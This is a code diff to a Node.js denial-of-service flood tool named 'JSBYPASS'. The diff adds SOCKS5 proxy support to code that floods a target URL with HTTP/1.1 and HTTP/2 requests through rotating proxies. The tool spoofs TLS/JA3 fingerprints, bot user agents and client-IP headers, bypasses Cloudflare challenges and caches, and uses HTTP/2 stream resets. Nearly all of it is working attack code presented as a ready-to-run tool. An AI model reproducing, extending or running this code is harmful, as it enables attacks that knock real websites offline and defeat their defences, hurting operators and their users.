@@ -6,6 +6,7 @@ const fs = require('fs');
 const os = require('os');
 const crypto = require('crypto');
 const chalk = require('chalk');
+const { SocksClient } = require('socks');
 
 process.env.UV_THREADPOOL_SIZE = os.cpus().length;
 
@@ -83,7 +84,7 @@ const fakeBot = fakeBotIndex !== -1 && fakeBotIndex + 1 < process.argv.length ? 
 const authIndex = process.argv.indexOf('--authorization');
 const authValue = authIndex !== -1 && authIndex + 1 < process.argv.length ? process.argv[authIndex + 1] : undefined;
 const authProxyFlag = process.argv.includes('--auth');
-
+const socks5Flag = process.argv.includes('--socks5');   // NEW: SOCKS5 flag
 
 if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
     console.clear();
@@ -94,7 +95,7 @@ if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
      ${chalk.blue('Usage:')}
         node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy> [ Options ]
      ${chalk.red('Example:')}
-        node ${process.argv} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --randpath 1 --debug --cache --cookie "uh=good" --delay 1 --referer rand --postdata "user=f&pass=%RAND%" --authorization Bearer:abc123 --randrate --full --fakebot true --auth
+        node ${process.argv} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --randpath 1 --debug --cache --cookie "uh=good" --delay 1 --referer rand --postdata "user=f&pass=%RAND%" --authorization Bearer:abc123 --randrate --full --fakebot true --auth --socks5
      ${chalk.yellow('Options:')}
       --randpath 1/2/3 - Query string with rand ex 1 - ?cf__chl_tk 2 - ?randomstring 3 - ?q=fwfwwfwfw
       --cache - Enable cache bypass techniques
@@ -111,9 +112,9 @@ if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
       --header "name:value#name2:value2" - Custom headers
       --fakebot true/false - Use bot User-Agent (TelegramBot, GPTBot, GoogleBot, etc.)
       --auth - Use proxies authorization ( format ip:port:username:password )
+      --socks5 - Use SOCKS5 proxies instead of HTTP proxies
 
     `);
-
 
     process.exit(1);
 }
@@ -141,6 +142,7 @@ if (proxy.length === 0) {
     process.exit(1);
 }
 
+// ========== HELPER FUNCTIONS ==========
 const getRandomChar = () => {
     const alphabet = 'abcdefghijklmnopqrstuvwxyz';
     const randomIndex = Math.floor(Math.random() * alphabet.length);
@@ -280,14 +282,14 @@ function generateLegitIP() {
         { asn: "AS32934", country: "US", ip: "157.240.0." },
         { asn: "AS54113", country: "US", ip: "104.244.42." },
         { asn: "AS15133", country: "US", ip: "69.171.250." },
-        { asn: "AS7643", country: "VN", ip: "123.30.134." },  // VNPT[10]
-        { asn: "AS18403", country: "VN", ip: "14.160.0." },   // FPT Telecom[1][9]
-        { asn: "AS24086", country: "VN", ip: "42.112.0." },   // Viettel[6]
-        { asn: "AS38733", country: "VN", ip: "103.2.224." },  // CMC Telecom[1]
-        { asn: "AS45543", country: "VN", ip: "113.22.0." },   // Saigon Tourist Cable[6]
-        { asn: "AS7602", country: "VN", ip: "27.68.128." },   // Saigon Postel[6]
-        { asn: "AS131127", country: "VN", ip: "103.17.88." }, // Global Technology[1]
-        { asn: "AS140741", country: "VN", ip: "103.167.198." } // VNNIC[1]
+        { asn: "AS7643", country: "VN", ip: "123.30.134." },
+        { asn: "AS18403", country: "VN", ip: "14.160.0." },
+        { asn: "AS24086", country: "VN", ip: "42.112.0." },
+        { asn: "AS38733", country: "VN", ip: "103.2.224." },
+        { asn: "AS45543", country: "VN", ip: "113.22.0." },
+        { asn: "AS7602", country: "VN", ip: "27.68.128." },
+        { asn: "AS131127", country: "VN", ip: "103.17.88." },
+        { asn: "AS140741", country: "VN", ip: "103.167.198." }
     ];
 
     const data = asnData[Math.floor(Math.random() * asnData.length)];
@@ -435,6 +437,7 @@ const cache_bypass = [
     {'cache-tag': 'none'},
     {'clear-site-data': '"cache"'},
 ];
+
 function generateJA3Fingerprint() {
     const ciphers = [
         'TLS_AES_128_GCM_SHA256',
@@ -572,9 +575,9 @@ function generateBrowserFingerprint() {
         'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
         'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
         'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)',
-        'Mozilla/5.0 (compatible; Google-Extended/1.0; +https://developers.google.com/search/docs/crawling-indexing/google-extended)', // Google Extended
-        'Mozilla/5.0 (compatible; Pinterestbot/1.0; +https://www.pinterest.com/bot.html)', // Pinterest
-        'Mozilla/5.0 (compatible; ClaudeBot/1.0; +claude.ai)', // Claude AI
+        'Mozilla/5.0 (compatible; Google-Extended/1.0; +https://developers.google.com/search/docs/crawling-indexing/google-extended)',
+        'Mozilla/5.0 (compatible; Pinterestbot/1.0; +https://www.pinterest.com/bot.html)',
+        'Mozilla/5.0 (compatible; ClaudeBot/1.0; +claude.ai)',
         'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/${rdversion}.0.0.0 Safari/537.36'
     ];
 
@@ -647,6 +650,7 @@ function generateBrowserFingerprint() {
     };
 }
 const fingerprint = generateBrowserFingerprint();
+
 function colorizeStatus(status, count) {
     const greenStatuses = ['200', '404'];
     const redStatuses = ['403', '429'];
@@ -668,8 +672,8 @@ function colorizeStatus(status, count) {
     return `${coloredStatus}: ${underlinedCount}`;
 }
 
+// ========== CORE CONNECTION FUNCTION ==========
 function go() {
-
     let proxyLine = proxy[~~(Math.random() * proxy.length)];
     let proxyHost, proxyPort, proxyUser, proxyPass;
     if (authProxyFlag) {
@@ -685,260 +689,311 @@ function go() {
 
     let tlsSocket;
 
-    const netSocket = net.connect({
-        host: proxyHost,
-        port: Number(proxyPort),
-        keepAlive: true, // Bật keep-alive
-        keepAliveMsecs: 10000 // Giữ kết nối trong 10 giây
-    }, () => {
-        //old
-        netSocket.once('data', () => {
-            proxyConnections++;
-            tlsSocket = tls.connect({
-                socket: netSocket,
-                ALPNProtocols: ['h2', 'http/1.1'],
-                servername: url.host,
-                ciphers: ja3Fingerprint.ciphers.join(':'),
-                sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
-                secureOptions: 
-                    crypto.constants.SSL_OP_NO_SSLv2 |
-                    crypto.constants.SSL_OP_NO_SSLv3 |
-                    crypto.constants.SSL_OP_NO_TLSv1 |
-                    crypto.constants.SSL_OP_NO_TLSv1_1 |
-                    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
-                    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
-                    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
-                    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
-                    crypto.constants.SSL_OP_SINGLE_DH_USE |
-                    crypto.constants.SSL_OP_SINGLE_ECDH_USE,
-                secure: true,
-                session: crypto.randomBytes(64),
-                minVersion: 'TLSv1.2',
-                maxVersion: 'TLSv1.3',
-                ecdhCurve: ja3Fingerprint.curves.join(':'),
-                supportedVersions: ['TLSv1.3', 'TLSv1.2'],
-                supportedGroups: ja3Fingerprint.curves.join(':'),
-                applicationLayerProtocolNegotiation: ja3Fingerprint.extensions.includes('16') ? ['h2', 'http/11'] : ['h2'],
-                rejectUnauthorized: false,
-                fingerprint: fingerprint,
-                keepAlive: true, // Bật keep-alive cho TLS
-                keepAliveMsecs: 10000
-            }, () => {
-                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
-                    if (forceHttp == 2) {
-                        tlsSocket.end(() => tlsSocket.destroy());
-                        return;
-                    }
+    if (socks5Flag) {
+        // ===== SOCKS5 CONNECTION =====
+        const socksOptions = {
+            proxy: {
+                host: proxyHost,
+                port: parseInt(proxyPort),
+                type: 5,
+                ...(authProxyFlag && proxyUser && proxyPass ? {
+                    userId: proxyUser,
+                    password: proxyPass
+                } : {})
+            },
+            command: 'connect',
+            destination: {
+                host: url.hostname,
+                port: 443
+            },
+            timeout: 10000
+        };
 
-                    function main() {
-                        const method = enableCache ? getRandomMethod() : reqmethod;
-                        const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
-                        const h1payl = `${method} ${path}${url.search || ''}${postdata ? `?${postdata}` : ''} HTTP/1.1\r\nHost: ${url.hostname}\r\nUser-Agent: CheckHost[](https://check-host.net)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n${enableCache ? 'Cache-Control: no-cache, no-store, must-revalidate\r\n' : ''}${hcookie ? `Cookie: ${hcookie}\r\n` : ''}${currentRefererValue ? `Referer: ${currentRefererValue}\r\n` : ''}${generateAuthorizationHeader(authValue) ? `Authorization: ${generateAuthorizationHeader(authValue)}\r\n` : ''}${customHeaders ? customHeaders.split('#').map(h => { const [n, v] = h.split(':'); return `${n.trim()}: ${v.trim()}\r\n`; }).join('') : ''}Connection: keep-alive\r\n\r\n`;
-                        tlsSocket.write(h1payl, (err) => {
-                            if (!err) {
-                                setTimeout(() => {
-                                    main();
-                                }, isFull ? 300 : 300 / ratelimit);
-                            } else {
-                                tlsSocket.end(() => tlsSocket.destroy());
+        SocksClient.createConnection(socksOptions)
+            .then((info) => {
+                const socket = info.socket;
+                proxyConnections++;
+                
+                tlsSocket = tls.connect({
+                    socket: socket,
+                    ALPNProtocols: ['h2', 'http/1.1'],
+                    servername: url.host,
+                    ciphers: ja3Fingerprint.ciphers.join(':'),
+                    sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
+                    secureOptions: 
+                        crypto.constants.SSL_OP_NO_SSLv2 |
+                        crypto.constants.SSL_OP_NO_SSLv3 |
+                        crypto.constants.SSL_OP_NO_TLSv1 |
+                        crypto.constants.SSL_OP_NO_TLSv1_1 |
+                        crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
+                        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
+                        crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
+                        crypto.constants.SSL_OP_COOKIE_EXCHANGE |
+                        crypto.constants.SSL_OP_SINGLE_DH_USE |
+                        crypto.constants.SSL_OP_SINGLE_ECDH_USE,
+                    secure: true,
+                    session: crypto.randomBytes(64),
+                    minVersion: 'TLSv1.2',
+                    maxVersion: 'TLSv1.3',
+                    ecdhCurve: ja3Fingerprint.curves.join(':'),
+                    supportedVersions: ['TLSv1.3', 'TLSv1.2'],
+                    supportedGroups: ja3Fingerprint.curves.join(':'),
+                    applicationLayerProtocolNegotiation: ja3Fingerprint.extensions.includes('16') ? ['h2', 'http/11'] : ['h2'],
+                    rejectUnauthorized: false,
+                    fingerprint: fingerprint,
+                    keepAlive: true,
+                    keepAliveMsecs: 10000
+                }, () => {
+                    // TLS connected, now run HTTP/2 or HTTP/1.1
+                    handleTlsConnection(socket);
+                }).on('error', () => {
+                    tlsSocket.destroy();
+                    socket.destroy();
+                });
+            })
+            .catch((err) => {
+                setTimeout(go, getRandomInt(50, 200));
+            });
+    } else {
+        // ===== HTTP PROXY CONNECTION (original) =====
+        const netSocket = net.connect({
+            host: proxyHost,
+            port: Number(proxyPort),
+            keepAlive: true,
+            keepAliveMsecs: 10000
+        }, () => {
+            netSocket.once('data', () => {
+                proxyConnections++;
+                tlsSocket = tls.connect({
+                    socket: netSocket,
+                    ALPNProtocols: ['h2', 'http/1.1'],
+                    servername: url.host,
+                    ciphers: ja3Fingerprint.ciphers.join(':'),
+                    sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
+                    secureOptions: 
+                        crypto.constants.SSL_OP_NO_SSLv2 |
+                        crypto.constants.SSL_OP_NO_SSLv3 |
+                        crypto.constants.SSL_OP_NO_TLSv1 |
+                        crypto.constants.SSL_OP_NO_TLSv1_1 |
+                        crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
+                        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
+                        crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
+                        crypto.constants.SSL_OP_COOKIE_EXCHANGE |
+                        crypto.constants.SSL_OP_SINGLE_DH_USE |
+                        crypto.constants.SSL_OP_SINGLE_ECDH_USE,
+                    secure: true,
+                    session: crypto.randomBytes(64),
+                    minVersion: 'TLSv1.2',
+                    maxVersion: 'TLSv1.3',
+                    ecdhCurve: ja3Fingerprint.curves.join(':'),
+                    supportedVersions: ['TLSv1.3', 'TLSv1.2'],
+                    supportedGroups: ja3Fingerprint.curves.join(':'),
+                    applicationLayerProtocolNegotiation: ja3Fingerprint.extensions.includes('16') ? ['h2', 'http/11'] : ['h2'],
+                    rejectUnauthorized: false,
+                    fingerprint: fingerprint,
+                    keepAlive: true,
+                    keepAliveMsecs: 10000
+                }, () => {
+                    handleTlsConnection(netSocket);
+                }).on('error', () => {
+                    tlsSocket.destroy();
+                    netSocket.destroy();
+                });
+            });
+
+            let connectRequest = `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nConnection: Keep-Alive\r\nClient-IP: ${legitIP}\r\nX-Client-IP: ${legitIP}\r\nVia: 1.1 ${legitIP}`;
+            if (authProxyFlag && proxyUser && proxyPass) {
+                const auth = Buffer.from(`${proxyUser}:${proxyPass}`).toString('base64');
+                connectRequest += `\r\nProxy-Authorization: Basic ${auth}`;
+            }
+            connectRequest += `\r\n\r\n`;
+            netSocket.write(connectRequest);
+
+        }).once('error', () => { }).once('close', () => {
+            if (tlsSocket) {
+                tlsSocket.end(() => { tlsSocket.destroy(); go(); });
+            }
+        });
+
+        netSocket.on('error', () => {
+            setTimeout(go, getRandomInt(50, 200));
+        });
+    }
+
+    // Unified TLS handler
+    function handleTlsConnection(baseSocket) {
+        if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
+            if (forceHttp == 2) {
+                tlsSocket.end(() => tlsSocket.destroy());
+                return;
+            }
+
+            function main() {
+                const method = enableCache ? getRandomMethod() : reqmethod;
+                const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
+                const h1payl = `${method} ${path}${url.search || ''}${postdata ? `?${postdata}` : ''} HTTP/1.1\r\nHost: ${url.hostname}\r\nUser-Agent: CheckHost[](https://check-host.net)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n${enableCache ? 'Cache-Control: no-cache, no-store, must-revalidate\r\n' : ''}${hcookie ? `Cookie: ${hcookie}\r\n` : ''}${currentRefererValue ? `Referer: ${currentRefererValue}\r\n` : ''}${generateAuthorizationHeader(authValue) ? `Authorization: ${generateAuthorizationHeader(authValue)}\r\n` : ''}${customHeaders ? customHeaders.split('#').map(h => { const [n, v] = h.split(':'); return `${n.trim()}: ${v.trim()}\r\n`; }).join('') : ''}Connection: keep-alive\r\n\r\n`;
+                tlsSocket.write(h1payl, (err) => {
+                    if (!err) {
+                        setTimeout(() => {
+                            main();
+                        }, isFull ? 300 : 300 / ratelimit);
+                    } else {
+                        tlsSocket.end(() => tlsSocket.destroy());
+                    }
+                });
+            }
+
+            main();
+            tlsSocket.on('error', () => {
+                tlsSocket.end(() => tlsSocket.destroy());
+            });
+            return;
+        }
+
+        if (forceHttp == 1) {
+            tlsSocket.end(() => tlsSocket.destroy());
+            return;
+        }
+
+        // HTTP/2
+        let streamId = 1;
+        let data = Buffer.alloc(0);
+        let hpack = new HPACK();
+        hpack.setTableSize(http2Fingerprint.HEADER_TABLE_SIZE);
+
+        const updateWindow = Buffer.alloc(4);
+        updateWindow.writeUInt32BE(custom_update, 0);
+        const frames1 = [];
+        const frames = [
+            Buffer.from(PREFACE, 'binary'),
+            encodeFrame(0, 4, encodeSettings([
+                [1, http2Fingerprint.HEADER_TABLE_SIZE],
+                [2, http2Fingerprint.ENABLE_PUSH],
+                [3, http2Fingerprint.MAX_CONCURRENT_STREAMS],
+                [4, http2Fingerprint.INITIAL_WINDOW_SIZE],
+                [5, http2Fingerprint.MAX_FRAME_SIZE],
+                [6, http2Fingerprint.MAX_HEADER_LIST_SIZE],
+                [8, http2Fingerprint.ENABLE_CONNECT_PROTOCOL]
+            ])),
+            encodeFrame(0, 8, updateWindow)
+        ];
+        frames1.push(...frames);
+
+        tlsSocket.on('data', (eventData) => {
+            data = Buffer.concat([data, eventData]);
+
+            while (data.length >= 9) {
+                const frame = decodeFrame(data);
+                if (frame != null) {
+                    data = data.subarray(frame.length + 9);
+                    if (frame.type == 4 && frame.flags == 0) {
+                        tlsSocket.write(encodeFrame(0, 4, "", 1));
+                    }
+                    if (frame.type == 1) {
+                        const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];
+                        if (status == 403 || status == 400) {
+                            tlsSocket.write(encodeRstStream(0));
+                            tlsSocket.end(() => tlsSocket.destroy());
+                            baseSocket.destroy();
+                        }
+                        if (!statuses[status])
+                            statuses[status] = 0;
+                        statuses[status]++;
+                    }
+                    if (frame.type == 7 || frame.type == 5) {
+                        if (frame.type == 7) {
+                            if (debugMode) {
+                                if (!statuses['GOAWAY'])
+                                    statuses['GOAWAY'] = 0;
+                                statuses['GOAWAY']++;
                             }
-                        });
-                    }
-
-                    main();
-
-                    tlsSocket.on('error', () => {
+                        }
+                        tlsSocket.write(encodeRstStream(0));
                         tlsSocket.end(() => tlsSocket.destroy());
-                    });
-                    return;
+                    }
+                } else {
+                    break;
+                }
+            }
+        });
+
+        tlsSocket.write(Buffer.concat(frames1));
+
+        function main() {
+            if (tlsSocket.destroyed) return;
+            const requests = [];
+            let localRatelimit = randrate ? getRandomInt(1, 90) : ratelimit !== undefined ? getRandomInt(20, 30) : process.argv[6];
+            const startTime = Date.now();
+            const customHeadersArray = [];
+            if (customHeaders) {
+                customHeaders.split('#').forEach(header => {
+                    const [name, value] = header.split(':').map(part => part?.trim());
+                    if (name && value) customHeadersArray.push({ [name.toLowerCase()]: value });
+                });
+            }
+
+            for (let i = 0; i < (isFull ? localRatelimit : 1); i++) {
+                const method = enableCache ? getRandomMethod() : reqmethod;
+                const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
+                const pseudoHeaders = [
+                    [":method", method],
+                    [":authority", url.hostname],
+                    [":scheme", "https"],
+                    [":path", path],
+                ];
+
+                const regularHeaders = generateDynamicHeaders().filter(a => a[1] != null);
+                const additionalRegularHeaders = Object.entries({
+                    ...(Math.random() > 0.6 && { "priority": "u=0, i" }),
+                    ...(Math.random() > 0.4 && { "dnt": "1" }),
+                    ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
+                    ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
+                    ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
+                    ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
+                }).filter(a => a[1] != null);
+
+                const allRegularHeaders = [...regularHeaders, ...additionalRegularHeaders];
+                shuffle(allRegularHeaders);
+
+                const combinedHeaders = [
+                    ...pseudoHeaders,
+                    ...allRegularHeaders,
+                    ['cookie', generateCfClearanceCookie()],
+                    ...generateChallengeHeaders(),
+                    ...customHeadersArray.reduce((acc, header) => [...acc, ...Object.entries(header)], [])
+                ];
+
+                const packed = Buffer.concat([
+                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
+                    hpack.encode(combinedHeaders)
+                ]);
+                const flags = 0x1 | 0x4 | 0x8 | 0x20;
+                const encodedFrame = encodeFrame(streamId, 1, packed, flags);
+                const frame = Buffer.concat([encodedFrame]);
+                if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
+                    const rstStreamFrame = encodeRstStream(streamId, 8);
+                    tlsSocket.write(Buffer.concat([rstStreamFrame, frame]));
+                    STREAMID_RESET = 0;
                 }
 
-                if (forceHttp == 1) {
+                requests.push(encodeFrame(streamId, 1, packed, 0x25));
+                streamId += 4;
+            }
+
+            tlsSocket.write(Buffer.concat(requests), (err) => {
+                if (err) {
                     tlsSocket.end(() => tlsSocket.destroy());
                     return;
                 }
-
-                let streamId = 1;
-                let data = Buffer.alloc(0);
-                let hpack = new HPACK();
-                hpack.setTableSize(http2Fingerprint.HEADER_TABLE_SIZE);
-
-                const updateWindow = Buffer.alloc(4);
-                updateWindow.writeUInt32BE(custom_update, 0);
-                const frames1 = [];
-                const frames = [
-                    Buffer.from(PREFACE, 'binary'),
-                    encodeFrame(0, 4, encodeSettings([
-                        [1, http2Fingerprint.HEADER_TABLE_SIZE],
-                        [2, http2Fingerprint.ENABLE_PUSH],
-                        [3, http2Fingerprint.MAX_CONCURRENT_STREAMS],
-                        [4, http2Fingerprint.INITIAL_WINDOW_SIZE],
-                        [5, http2Fingerprint.MAX_FRAME_SIZE],
-                        [6, http2Fingerprint.MAX_HEADER_LIST_SIZE],
-                        [8, http2Fingerprint.ENABLE_CONNECT_PROTOCOL]
-                    ])),
-                    encodeFrame(0, 8, updateWindow)
-                ];
-                frames1.push(...frames);
-
-                tlsSocket.on('data', (eventData) => {
-                    data = Buffer.concat([data, eventData]);
-
-                    while (data.length >= 9) {
-                        const frame = decodeFrame(data);
-                        if (frame != null) {
-                            data = data.subarray(frame.length + 9);
-                            if (frame.type == 4 && frame.flags == 0) {
-                                tlsSocket.write(encodeFrame(0, 4, "", 1));
-                            }
-                            if (frame.type == 1) {
-                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];
-                                if (status == 403 || status == 400) {
-                                    tlsSocket.write(encodeRstStream(0));
-                                    tlsSocket.end(() => tlsSocket.destroy());
-                                    netSocket.end(() => netSocket.destroy());
-                                }
-                                if (!statuses[status])
-                                    statuses[status] = 0;
-
-                                statuses[status]++;
-                            }
-                            
-                            if (frame.type == 7 || frame.type == 5) {
-                                if (frame.type == 7) {
-                                    if (debugMode) {
-                                        if (!statuses['GOAWAY'])
-                                            statuses['GOAWAY'] = 0;
-
-                                        statuses['GOAWAY']++;
-                                    }
-                                }
-
-                                tlsSocket.write(encodeRstStream(0));
-                                tlsSocket.end(() => tlsSocket.destroy());
-                            }
-                        } else {
-                            break;
-                        }
-                    }
-                });
-
-                tlsSocket.write(Buffer.concat(frames1));
-                
-                function main() {
-                    if (tlsSocket.destroyed) {
-                        return;
-                    }
-                    const requests = [];
-                    let localRatelimit = randrate ? getRandomInt(1, 90) : ratelimit !== undefined ? getRandomInt(20, 30) : process.argv[6];
-                    const startTime = Date.now();
-                    const customHeadersArray = [];
-                    if (customHeaders) {
-                        customHeaders.split('#').forEach(header => {
-                            const [name, value] = header.split(':').map(part => part?.trim());
-                            if (name && value) customHeadersArray.push({ [name.toLowerCase()]: value });
-                        });
-                    }
-
-                    for (let i = 0; i < (isFull ? localRatelimit : 1); i++) {
-                        let randomNum = Math.floor(Math.random() * (10000 - 100 + 1) + 10000);
-                        const method = enableCache ? getRandomMethod() : reqmethod;
-                        const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
-                        const pseudoHeaders = [
-                            [":method", method],
-                            [":authority", url.hostname],
-                            [":scheme", "https"],
-                            [":path", path],
-                        ];
-
-                        const regularHeaders = generateDynamicHeaders().filter(a => a[1] != null);
-                        const additionalRegularHeaders = Object.entries({
-                            ...(Math.random() > 0.6 && { "priority": "u=0, i" }),
-                            ...(Math.random() > 0.4 && { "dnt": "1" }),
-                            ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
-                            ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
-                            ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
-                            ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
-                        }).filter(a => a[1] != null);
-
-                        const allRegularHeaders = [...regularHeaders, ...additionalRegularHeaders];
-                        shuffle(allRegularHeaders);
-
-                        const combinedHeaders = [
-                            ...pseudoHeaders,
-                            ...allRegularHeaders,
-                            ['cookie', generateCfClearanceCookie()],
-                            ...generateChallengeHeaders(),
-                            ...customHeadersArray.reduce((acc, header) => [...acc, ...Object.entries(header)], [])
-                        ];
-
-                        const packed = Buffer.concat([
-                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
-                            hpack.encode(combinedHeaders)
-                        ]);
-                        const flags = 0x1 | 0x4 | 0x8 | 0x20;
-                        const encodedFrame = encodeFrame(streamId, 1, packed, flags);
-                        const frame = Buffer.concat([encodedFrame]);
-                        if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
-                            const rstStreamFrame = encodeRstStream(streamId, 8);
-                            tlsSocket.write(Buffer.concat([rstStreamFrame, frame]));
-                            STREAMID_RESET = 0;
-                        }
-
-                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
-                        streamId += 4;
-                    }
-
-                    tlsSocket.write(Buffer.concat(requests), (err) => {
-                        if (err) {
-                            tlsSocket.end(() => tlsSocket.destroy());
-                            return;
-                        }
-                        const elapsed = Date.now() - startTime;
-                        const delay = Math.max(50, (150 / localRatelimit) - elapsed);
-                        setTimeout(() => main(), delay);
-                    });
-                }
-                main();
-            }).on('error', () => {
-                tlsSocket.destroy();
+                const elapsed = Date.now() - startTime;
+                const delay = Math.max(50, (150 / localRatelimit) - elapsed);
+                setTimeout(() => main(), delay);
             });
-        });
-
-        let connectRequest = `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nConnection: Keep-Alive\r\nClient-IP: ${legitIP}\r\nX-Client-IP: ${legitIP}\r\nVia: 1.1 ${legitIP}`;
-        if (authProxyFlag && proxyUser && proxyPass) {
-            const auth = Buffer.from(`${proxyUser}:${proxyPass}`).toString('base64');
-            connectRequest += `\r\nProxy-Authorization: Basic ${auth}`;
         }
-        connectRequest += `\r\n\r\n`;
-        netSocket.write(connectRequest);
-
-    }).once('error', () => { }).once('close', () => {
-        if (tlsSocket) {
-            tlsSocket.end(() => { tlsSocket.destroy(); go(); });
-        }
-    });
-
-    netSocket.on('error', (error) => {
-        cleanup(error);
-    });
-    
-    netSocket.on('close', () => {
-        cleanup();
-    });
-    
-    function cleanup(error) {
-        if (error) {
-            setTimeout(go, getRandomInt(50, 200));
-        }
-        if (netSocket) {
-            netSocket.destroy();
-        }
-        if (tlsSocket) {
-            tlsSocket.end();
-        }
+        main();
     }
 }
+
 function handleQuery(query) {
     if (query === '1') {
         return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
@@ -958,11 +1013,11 @@ function generateCacheQuery() {
         `?ts=${Date.now()}_${randstr(4)}`,
         `?cb=${crypto.randomBytes(4).toString('hex')}`,
         `?rnd=${generateRandomString(5, 10)}`,
-        `?param1=${randstr(4)}&param2=${crypto.randomBytes(4).toString('hex')}&rnd=${generateRandomString(3, 8)}`, // Thêm đa params
-        `?cb=${randstr(6)}&ts=${Date.now()}&extra=${randstr(5)}`, // Kết hợp nhiều hơn
-        `?v=${encodeURIComponent(randstr(8))}&cb=${Date.now()}`, // Encoded để tránh filter
-        `?param=${randstr(5)}&extra=${crypto.randomBytes(8).toString('base64')}`, // Base64 cho complexity
-        `?ts=${Date.now()}&rnd=${generateRandomString(10, 20)}&hash=${crypto.createHash('md5').update(randstr(10)).digest('hex').slice(0,8)}` // Thêm hash
+        `?param1=${randstr(4)}&param2=${crypto.randomBytes(4).toString('hex')}&rnd=${generateRandomString(3, 8)}`,
+        `?cb=${randstr(6)}&ts=${Date.now()}&extra=${randstr(5)}`,
+        `?v=${encodeURIComponent(randstr(8))}&cb=${Date.now()}`,
+        `?param=${randstr(5)}&extra=${crypto.randomBytes(8).toString('base64')}`,
+        `?ts=${Date.now()}&rnd=${generateRandomString(10, 20)}&hash=${crypto.createHash('md5').update(randstr(10)).digest('hex').slice(0,8)}`
     ];
     return cacheBypassQueries[Math.floor(Math.random() * cacheBypassQueries.length)];
 }
@@ -982,7 +1037,6 @@ setInterval(() => {
         custom_window = 6291456;
         custom_header = 262144;
         custom_update = 15663105;
-        
         timer = 0;
     }
 }, 10000);
@@ -991,7 +1045,7 @@ if (cluster.isMaster) {
     const workers = {};
 
     Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
-    console.log(`Attack Lauched `);
+    console.log(`Attack Launched with ${socks5Flag ? 'SOCKS5' : 'HTTP'} proxies`);
 
     cluster.on('exit', (worker) => {
         cluster.fork({ core: worker.id % os.cpus().length });
@@ -1018,18 +1072,14 @@ if (cluster.isMaster) {
                     }
                 }
             }
-            // Định dạng trạng thái với màu sắc
             const statusString = Object.entries(statuses)
                 .map(([status, count]) => colorizeStatus(status, count))
                 .join(', ');
             console.clear();
-            console.log(`[${chalk.magenta.bold('JSBYPASS/')}] | Date: [${chalk.blue.bold(new Date().toLocaleString('en-US'))}] | Status: [${statusString}] | ProxyConnect: [${chalk.cyan.bold(totalConnections)}]`);
+            console.log(`[${chalk.magenta.bold('JSBYPASS/')}] | Proxy: [${chalk.yellow.bold(socks5Flag ? 'SOCKS5' : 'HTTP')}] | Date: [${chalk.blue.bold(new Date().toLocaleString('en-US'))}] | Status: [${statusString}] | ProxyConnect: [${chalk.cyan.bold(totalConnections)}]`);
             proxyConnections = 0;
         }, 1000);
